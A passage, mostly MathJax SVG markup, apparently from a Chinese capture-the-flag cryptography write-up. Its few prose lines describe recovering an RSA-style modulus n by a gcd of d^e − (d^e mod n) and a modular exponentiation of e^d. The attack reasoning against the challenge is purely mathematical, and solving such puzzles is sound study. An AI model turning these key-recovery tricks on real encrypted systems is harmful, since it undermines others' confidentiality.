749Z"></path></g><g data-mml-node="mo" transform="translate(21126.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>, <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="0.817ex" height="1.441ex" role="img" focusable="false" viewBox="0 -626 361 637"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"></path></g></g></g></svg></mjx-container> 是某個整數, 而且應當很小, 所以求出 gcd 後就很容易拿到 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="1.357ex" height="1.025ex" role="img" focusable="false" viewBox="0 -442 600 453"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g></g></svg></mjx-container>.</p><p><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="17.395ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 7688.8 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mi" transform="translate(553,363) scale(0.707)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g></g><g data-mml-node="mo" transform="translate(1154.7,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mo" transform="translate(2155,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msup" transform="translate(2544,0)"><g data-mml-node="mi"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mi" transform="translate(553,363) scale(0.707)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g></g><g data-mml-node="mspace" transform="translate(3476.5,0)"></g><g data-mml-node="mi" transform="translate(4310.1,0)"><path data-c="6D" d="M41 46H55Q94 46 102 60V68Q102 77 102 91T102 122T103 161T103 203Q103 234 103 269T102 328V351Q99 370 88 376T43 385H25V408Q25 431 27 431L37 432Q47 433 65 434T102 436Q119 437 138 438T167 441T178 442H181V402Q181 364 182 364T187 369T199 384T218 402T247 421T285 437Q305 442 336 442Q351 442 364 440T387 434T406 426T421 417T432 406T441 395T448 384T452 374T455 366L457 361L460 365Q463 369 466 373T475 384T488 397T503 410T523 422T546 432T572 439T603 442Q729 442 740 329Q741 322 741 190V104Q741 66 743 59T754 49Q775 46 803 46H819V0H811L788 1Q764 2 737 2T699 3Q596 3 587 0H579V46H595Q656 46 656 62Q657 64 657 200Q656 335 655 343Q649 371 635 385T611 402T585 404Q540 404 506 370Q479 343 472 315T464 232V168V108Q464 78 465 68T468 55T477 49Q498 46 526 46H542V0H534L510 1Q487 2 460 2T422 3Q319 3 310 0H302V46H318Q379 46 379 62Q380 64 380 200Q379 335 378 343Q372 371 358 385T334 402T308 404Q263 404 229 370Q202 343 195 315T187 232V168V108Q187 78 188 68T191 55T200 49Q221 46 249 46H265V0H257L234 1Q210 2 183 2T145 3Q42 3 33 0H25V46H41Z"></path><path data-c="6F" d="M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z" transform="translate(833,0)"></path><path data-c="64" d="M376 495Q376 511 376 535T377 568Q377 613 367 624T316 637H298V660Q298 683 300 683L310 684Q320 685 339 686T376 688Q393 689 413 690T443 693T454 694H457V390Q457 84 458 81Q461 61 472 55T517 46H535V0Q533 0 459 -5T380 -11H373V44L365 37Q307 -11 235 -11Q158 -11 96 50T34 215Q34 315 97 378T244 442Q319 442 376 393V495ZM373 342Q328 405 260 405Q211 405 173 369Q146 341 139 305T131 211Q131 155 138 120T173 59Q203 26 251 26Q322 26 373 103V342Z" transform="translate(1333,0)"></path></g><g data-mml-node="mstyle" transform="translate(6199.1,0)"><g data-mml-node="mspace"></g></g><g data-mml-node="mstyle" transform="translate(6366.1,0)"><g data-mml-node="mspace"></g></g><g data-mml-node="mi" transform="translate(6699.8,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(7299.8,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container> 很好計算, 但是 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="17.324ex" height="2.497ex" role="img" focusable="false" viewBox="0 -853.7 7657.2 1103.7"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mi" transform="translate(499,363) scale(0.707)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g></g><g data-mml-node="mo" transform="translate(1138.9,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mo" transform="translate(2139.1,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msup" transform="translate(2528.1,0)"><g data-mml-node="mi"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mi" transform="translate(499,363) scale(0.707)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g></g><g data-mml-node="mspace" transform="translate(3444.8,0)"></g><g data-mml-node="mi" transform="translate(4278.5,0)"><path data-c="6D" d="M41 46H55Q94 46 102 60V68Q102 77 102 91T102 122T103 161T103 203Q103 234 103 269T102 328V351Q99 370 88 376T43 385H25V408Q25 431 27 431L37 432Q47 433 65 434T102 436Q119 437 138 438T167 441T178 442H181V402Q181 364 182 364T187 369T199 384T218 402T247 421T285 437Q305 442 336 442Q351 442 364 440T387 434T406 426T421 417T432 406T441 395T448 384T452 374T455 366L457 361L460 365Q463 369 466 373T475 384T488 397T503 410T523 422T546 432T572 439T603 442Q729 442 740 329Q741 322 741 190V104Q741 66 743 59T754 49Q775 46 803 46H819V0H811L788 1Q764 2 737 2T699 3Q596 3 587 0H579V46H595Q656 46 656 62Q657 64 657 200Q656 335 655 343Q649 371 635 385T611 402T585 404Q540 404 506 370Q479 343 472 315T464 232V168V108Q464 78 465 68T468 55T477 49Q498 46 526 46H542V0H534L510 1Q487 2 460 2T422 3Q319 3 310 0H302V46H318Q379 46 379 62Q380 64 380 200Q379 335 378 343Q372 371 358 385T334 402T308 404Q263 404 229 370Q202 343 195 315T187 232V168V108Q187 78 188 68T191 55T200 49Q221 46 249 46H265V0H257L234 1Q210 2 183 2T145 3Q42 3 33 0H25V46H41Z"></path><path data-c="6F" d="M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z" transform="translate(833,0)"></path><path data-c="64" d="M376 495Q376 511 376 535T377 568Q377 613 367 624T316 637H298V660Q298 683 300 683L310 684Q320 685 339 686T376 688Q393 689 413 690T443 693T454 694H457V390Q457 84 458 81Q461 61 472 55T517 46H535V0Q533 0 459 -5T380 -11H373V44L365 37Q307 -11 235 -11Q158 -11 96 50T34 215Q34 315 97 378T244 442Q319 442 376 393V495ZM373 342Q328 405 260 405Q211 405 173 369Q146 341 139 305T131 211Q131 155 138 120T173 59Q203 26 251 26Q322 26 373 103V342Z" transform="translate(1333,0)"></path></g><g data-mml-node="mstyle" transform="translate(6167.5,0)"><g data-mml-node="mspace"></g></g><g data-mml-node="mstyle" transform="translate(6334.5,0)"><g data-mml-node="mspace"></g></g><g data-mml-node="mi" transform="translate(6668.2,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(7268.2,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container> 的指數太大了無法有效的運算, 所以我拿 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="42.504ex" height="2.497ex" role="img" focusable="false" viewBox="0 -853.7 18786.6 1103.7"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path></g><g data-mml-node="mi" transform="translate(503,0)"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path></g><g data-mml-node="mi" transform="translate(988,0)"><path data-c="1D464" d="M580 385Q580 406 599 424T641 443Q659 443 674 425T690 368Q690 339 671 253Q656 197 644 161T609 80T554 12T482 -11Q438 -11 404 5T355 48Q354 47 352 44Q311 -11 252 -11Q226 -11 202 -5T155 14T118 53T104 116Q104 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Q21 293 29 315T52 366T96 418T161 441Q204 441 227 416T250 358Q250 340 217 250T184 111Q184 65 205 46T258 26Q301 26 334 87L339 96V119Q339 122 339 128T340 136T341 143T342 152T345 165T348 182T354 206T362 238T373 281Q402 395 406 404Q419 431 449 431Q468 431 475 421T483 402Q483 389 454 274T422 142Q420 131 420 107V100Q420 85 423 71T442 42T487 26Q558 26 600 148Q609 171 620 213T632 273Q632 306 619 325T593 357T580 385Z"></path></g><g data-mml-node="mo" transform="translate(1704,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(2093,0)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mo" transform="translate(2559,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(3003.7,0)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mo" transform="translate(3523.7,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msup" transform="translate(3968.3,0)"><g data-mml-node="mi"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mi" transform="translate(553,363) scale(0.707)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g></g><g data-mml-node="mo" transform="translate(5123.1,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mo" transform="translate(6123.3,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msup" transform="translate(6512.3,0)"><g data-mml-node="mi"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mi" transform="translate(553,363) scale(0.707)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g></g><g data-mml-node="mspace" transform="translate(7444.8,0)"></g><g data-mml-node="mi" transform="translate(8278.5,0)"><path data-c="6D" d="M41 46H55Q94 46 102 60V68Q102 77 102 91T102 122T103 161T103 203Q103 234 103 269T102 328V351Q99 370 88 376T43 385H25V408Q25 431 27 431L37 432Q47 433 65 434T102 436Q119 437 138 438T167 441T178 442H181V402Q181 364 182 364T187 369T199 384T218 402T247 421T285 437Q305 442 336 442Q351 442 364 440T387 434T406 426T421 417T432 406T441 395T448 384T452 374T455 366L457 361L460 365Q463 369 466 373T475 384T488 397T503 410T523 422T546 432T572 439T603 442Q729 442 740 329Q741 322 741 190V104Q741 66 743 59T754 49Q775 46 803 46H819V0H811L788 1Q764 2 737 2T699 3Q596 3 587 0H579V46H595Q656 46 656 62Q657 64 657 200Q656 335 655 343Q649 371 635 385T611 402T585 404Q540 404 506 370Q479 343 472 315T464 232V168V108Q464 78 465 68T468 55T477 49Q498 46 526 46H542V0H534L510 1Q487 2 460 2T422 3Q319 3 310 0H302V46H318Q379 46 379 62Q380 64 380 200Q379 335 378 343Q372 371 358 385T334 402T308 404Q263 404 229 370Q202 343 195 315T187 232V168V108Q187 78 188 68T191 55T200 49Q221 46 249 46H265V0H257L234 1Q210 2 183 2T145 3Q42 3 33 0H25V46H41Z"></path><path data-c="6F" d="M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z" transform="translate(833,0)"></path><path data-c="64" d="M376 495Q376 511 376 535T377 568Q377 613 367 624T316 637H298V660Q298 683 300 683L310 684Q320 685 339 686T376 688Q393 689 413 690T443 693T454 694H457V390Q457 84 458 81Q461 61 472 55T517 46H535V0Q533 0 459 -5T380 -11H373V44L365 37Q307 -11 235 -11Q158 -11 96 50T34 215Q34 315 97 378T244 442Q319 442 376 393V495ZM373 342Q328 405 260 405Q211 405 173 369Q146 341 139 305T131 211Q131 155 138 120T173 59Q203 26 251 26Q322 26 373 103V342Z" transform="translate(1333,0)"></path></g><g data-mml-node="mstyle" transform="translate(10167.5,0)"><g data-mml-node="mspace"></g></g><g data-mml-node="mstyle" transform="translate(10334.5,0)"><g data-mml-node="mspace"></g></g><g data-mml-node="mi" transform="translate(10668.1,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(11268.1,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(11657.1,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(12268.4,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mo" transform="translate(13268.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msup" transform="translate(13657.6,0)"><g data-mml-node="mi"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 